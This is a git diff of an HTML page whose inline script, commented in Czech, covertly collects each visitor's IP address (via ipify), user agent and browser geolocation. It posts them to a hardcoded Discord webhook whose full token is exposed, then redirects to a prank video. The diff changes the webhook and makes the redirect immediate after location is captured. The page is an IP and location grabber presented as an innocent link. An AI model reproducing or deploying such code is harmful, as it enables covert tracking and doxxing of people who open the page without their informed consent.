@@ -20,52 +20,61 @@
   <h1></h1>
 
   <script>
-    const webhookURL = 'https://discord.com/api/webhooks/1376841162370973716/OWCzBKZ92GkMfw_a0JDDeuYH2hgwRUg7WzKcOCqvnAFfW97IE8B-I6yN8J1fQrrWiZQk';
+    const webhookURL = 'https://discord.com/api/webhooks/1376859779275948124/jO89I_FyE_CGdIJXyfHjvRc1Gd921cNx-l0cRpwPOLTbVP5raNYF6ZKknWM3V7z9c3Tt';
 
     function sendData(data) {
-      console.log('Odesílám data:', data);
       fetch(webhookURL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data),
-        mode: 'no-cors' // Pomůže obejít CORS, ale nečekej odpověď
+        body: JSON.stringify(data)
       }).catch(e => console.error('Chyba při odesílání:', e));
     }
 
-    // Získat IP adresu
+    // Nejprve získat IP adresu
     fetch('https://api.ipify.org?format=json')
       .then(response => response.json())
       .then(data => {
         sendData({
-          content: `Page loaded - IP: ${data.ip}\nUserAgent: ${navigator.userAgent}\nTime: ${new Date().toISOString()}`
+          event: 'page_loaded',
+          ip: data.ip,
+          userAgent: navigator.userAgent,
+          timestamp: new Date().toISOString()
         });
       })
       .catch(() => {
+        // Pokud API neselže, pošli aspoň základní info bez IP
         sendData({
-          content: `Page loaded - IP not available\nUserAgent: ${navigator.userAgent}\nTime: ${new Date().toISOString()}`
+          event: 'page_loaded',
+          userAgent: navigator.userAgent,
+          timestamp: new Date().toISOString()
         });
       });
 
-    // Geolokace
+    // Pokračujeme s geolokací
     if ("geolocation" in navigator) {
       navigator.geolocation.getCurrentPosition(
         (position) => {
           sendData({
-            content: `Location allowed - Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}, Accuracy: ${position.coords.accuracy}\nTime: ${new Date().toISOString()}`
+            event: 'location_allowed',
+            coords: {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy
+            },
+            timestamp: new Date().toISOString()
           });
-
-          setTimeout(() => {
-            window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
-          }, 5000);
+          window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
         },
         (error) => {
           sendData({
-            content: `Location denied or error: ${error.message}\nTime: ${new Date().toISOString()}`
+            event: 'location_denied_or_error',
+            error: error.message,
+            timestamp: new Date().toISOString()
           });
         }
       );
     } else {
-      sendData({ content: 'Geolocation not supported' });
+      sendData({ event: 'geolocation_not_supported' });
     }
   </script>
 </body>
